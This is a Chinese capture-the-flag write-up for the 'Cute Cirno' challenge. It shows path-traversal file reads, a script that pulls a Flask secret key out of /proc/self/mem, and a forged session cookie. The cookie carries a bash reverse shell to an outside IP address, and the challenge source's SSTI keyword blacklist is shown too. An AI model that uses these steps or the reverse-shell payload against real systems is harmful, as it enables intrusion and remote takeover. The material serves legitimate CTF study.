# Cute Cirno 复现

## 知识点

>   任意文件读取



## 解题

#### 查看源代码

```nginx
$('.comment').click(function() {
    $.ajax({
        url: "/r3aDF1le?filename=comment.txt",
            async: "true",
            dataType: "text",
            type: "get",
            success: function (data) {
            window.alert(data);
        }
    })
});
```

#### 任意文件读取

```nginx
# 读取 /proc/self/cmdline 来获取当前进程的详细信息
http://neepusec.fun:28567/r3aDF1le?filename=../../../proc/self/cmdline

# /usr/local/bin/python3/app/CuteCirno.py
```

### 拿源码

```nginx
http://neepusec.fun:28567/r3aDF1le?filename=../../../app/CuteCirno.py
```

```py

from flask import Flask, request, session, render_template, render_template_string
import os, base64
from NeepuFile import neepu_files

CuteCirno = Flask(__name__,
                  static_url_path='/static',
                  static_folder='static'
                  )

CuteCirno.config['SECRET_KEY'] = str(base64.b64encode(os.urandom(30)).decode()) + "*NeepuCTF*"

@CuteCirno.route('/')
def welcome():
    session['admin'] = 0
    return render_template('welcome.html')


@CuteCirno.route('/Cirno')
def show():
    return render_template('CleverCirno.html')


@CuteCirno.route('/r3aDF1le')
def file_read():
    filename = "static/text/" + request.args.get('filename', 'comment.txt')
    start = request.args.get('start', "0")
    end = request.args.get('end', "0")
    return neepu_files(filename, start, end)


@CuteCirno.route('/genius')
def calculate():
    if session.get('admin') == 1:
        print(session.get('admin'))
        answer = request.args.get('answer')
        if answer is not None:
            blacklist = ['_', "'", '"', '.', 'system', 'os', 'eval', 'exec', 'popen', 'subprocess',
                         'posix', 'builtins', 'namespace','open', 'read', '\\', 'self', 'mro', 'base',
                         'global', 'init', '/','00', 'chr', 'value', 'get', "url", 'pop', 'import',
                         'include','request', '{{', '}}', '"', 'config','=']
            for i in blacklist:
                if i in answer:
                    answer = "⑨" +"""</br><img src="static/woshibaka.jpg" width="300" height="300" alt="Cirno">"""
                    break
            if answer == '':
                return "你能告诉聪明的⑨, 1+1的answer吗"
            return render_template_string("1+1={}".format(answer))
        else:
            return render_template('mathclass.html')

    else:
        session['admin'] = 0
        return "你真的是我的马斯塔吗？"


if __name__ == '__main__':
    CuteCirno.run('0.0.0.0', 5000, debug=True)
```

### 获取session脚本

```nginx
import base64
import os
import  re
import requests
# print(str(base64.b64encode(os.urandom(30)).decode()) + "*NeepuCTF*")
# pollution_url="http://localhost:8848/?name=os.path.pardir&m1sery=boogipop"
# flagurl="http://localhost:8848/../../flag"
url="http://neepusec.fun:28733/r3ADF11e"
maps_url = f"{url}?filename=../../../proc/self/maps"
maps_reg = "([a-z0-9]{12}-[a-z0-9]{12}) rw.*?00000000 00:00 0"
maps = re.findall(maps_reg, requests.get(maps_url).text)
print(maps)
cookie=''
for m in maps:
    print(m)
    start, end = m.split("-")[0], m.split("-")[1]
    Offset, Length = str(int(start, 16)), str(int(end, 16))
    read_url = f"{url}?filename=../../../proc/self/mem&start={Offset}&end={Length}"
    print(read_url)
    s = requests.get(read_url).content
    # print(s)
    rt = re.findall(b"(.{40})\*NeepuCTF\*", s)
    if rt:
        print(rt[0])
# sRxNyxI1BPqvJSx5KAuMxMQFnuCfJSlHVhbx855a*NeepuCTF*
```

### 伪造session

```nginx
python flask_session_cookie_manager3.py encode -s
"sRxNyxI1BPqvJSx5KAuMxMQFnuCfJSlHVhbx855a*NeepuCTF*" -t "{'admin': 1,'__globals__':1,'os':1,'read':1,'popen':1,'bash -c \'bash -i >& /dev/tcp/114.116.119.253/7777 <&1\'':1}"
```





# ezphp

